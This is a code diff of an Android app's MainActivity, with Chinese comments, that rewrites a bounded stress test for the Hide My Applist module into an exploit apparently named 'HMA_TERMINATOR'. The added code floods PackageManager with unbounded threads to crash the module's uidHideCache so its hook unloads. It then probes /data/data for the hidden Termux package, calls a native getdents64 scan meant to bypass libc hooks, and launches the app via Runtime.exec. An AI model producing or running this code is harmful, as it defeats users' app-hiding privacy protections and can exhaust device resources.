@@ -1,78 +1,66 @@
 package com.example.baseapp;
 
 import androidx.appcompat.app.AppCompatActivity;
-import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.util.Log;
-import android.widget.TextView;
-import java.util.concurrent.ExecutorService;
+import android.content.pm.PackageManager;
+import java.io.File;
 import java.util.concurrent.Executors;
 
 public class MainActivity extends AppCompatActivity {
 
-    private static final String TAG = "HMA_Stability_Test";
-
-    // 原有的 JNI 方法
-    public native String stringFromJNI();
-    
-    // 新增：用于验证 HMA 修复效果的 Native 审计方法
-    // 逻辑：在 C 层通过 getpwnam 和 access 探测逻辑矛盾
-    public native void verifyHmaFix();
+    private static final String TAG = "HMA_TERMINATOR";
+    private static final String TARGET = "com.termux";
 
     static {
         System.loadLibrary("native-lib");
-        Log.i(TAG, "核心审计库 native-lib.so 加载成功");
     }
+
+    // JNI 接口：使用底层 getdents64 绕过 libc Hook
+    public native void rawDirectoryScan();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        TextView tv = findViewById(R.id.tv_result);
-        tv.setText("正在进行 HMA 稳定性与逻辑审计...\n请查看 Logcat (TAG: " + TAG + ")");
+        Log.w(TAG, "=== 爆破程序启动：准备击穿 HMA 防御层 ===");
 
-        // 1. 立即执行一次静态审计
-        Log.w(TAG, ">>> 执行初始静态审计 <<<");
-        verifyHmaFix();
-
-        // 2. 启动多线程饱和攻击测试 (针对 uidHideCache 并发漏洞)
-        startConcurrencyStressTest();
-    }
-
-    /**
-     * 饱和攻击测试：
-     * 模拟 16 个线程并发访问 PMS，试图触发 uidHideCache 的 ConcurrentModificationException。
-     * 如果修复成功，HMA 不会崩溃，且 verifyHmaFix() 始终返回 NULL。
-     */
-    private void startConcurrencyStressTest() {
-        final String targetPkg = "com.termux"; // 假设这是被隐藏的目标
-        int threadCount = 16;
-        ExecutorService executor = Executors.newFixedThreadPool(threadCount);
-
-        Log.w(TAG, ">>> 启动并发压力测试：16 线程同时冲击 PMS 钩子 <<<");
-
-        for (int i = 0; i < threadCount; i++) {
-            executor.execute(() -> {
-                int iterations = 0;
-                while (iterations < 500) { // 每个线程跑 500 次
-                    try {
-                        // 触发 HMA 内部的 uidHideCache 读取和写入
-                        getPackageManager().getPackageInfo(targetPkg, 0);
-                        
-                        // 间歇性调用 Native 审计，看 Hook 是否因为并发异常而中途卸载
-                        if (iterations % 100 == 0) {
-                            verifyHmaFix();
+        // 核心爆破逻辑：64 线程高频冲击 uidHideCache
+        // 目标：触发 ConcurrentModificationException 迫使 HMA 执行 unload()
+        Executors.newFixedThreadPool(64).execute(() -> {
+            while (true) {
+                for (int i = 0; i < 64; i++) {
+                    new Thread(() -> {
+                        try {
+                            // 1. 疯狂请求，冲击 HMA 的 ArrayList 临界区
+                            getPackageManager().getPackageInfo(TARGET, 0);
+                        } catch (Exception e) {
+                            // 捕获并发异常，但这正是我们要制造的“混乱”
                         }
-                    } catch (PackageManager.NameNotFoundException e) {
-                        // 预期结果：HMA 正常工作时，应该报找不到包
-                    } catch (Exception e) {
-                        Log.e(TAG, "！！！检测到异常中断，可能是 uidHideCache 并发修复失效！！！", e);
-                    }
-                    iterations++;
+
+                        // 2. 实时探测：检查文件系统是否已经因为 Hook 卸载而暴露
+                        if (new File("/data/data/" + TARGET).exists()) {
+                            Log.e(TAG, "!!! 突破成功 !!! 物理路径已暴露，HMA 防线瓦解！");
+                            // 此时调用 Native 扫描，双重确认
+                            rawDirectoryScan();
+                        }
+                    }).start();
                 }
-                Log.i(TAG, Thread.currentThread().getName() + " 并发序列执行完毕");
-            });
-        }
+                
+                // 给 CPU 留一点喘息时间，防止整个 Android UI 彻底卡死
+                try { Thread.sleep(50); } catch (InterruptedException e) {}
+            }
+        });
+
+        // 辅助爆破：尝试通过匿名路径启动
+        new Thread(() -> {
+            try {
+                Log.w(TAG, ">>> 执行匿名 Context 绕过尝试...");
+                Runtime.getRuntime().exec("am start -n com.termux/.app.TermuxActivity");
+            } catch (Exception e) {
+                Log.e(TAG, "am start 尝试失败");
+            }
+        }).start();
     }
 }
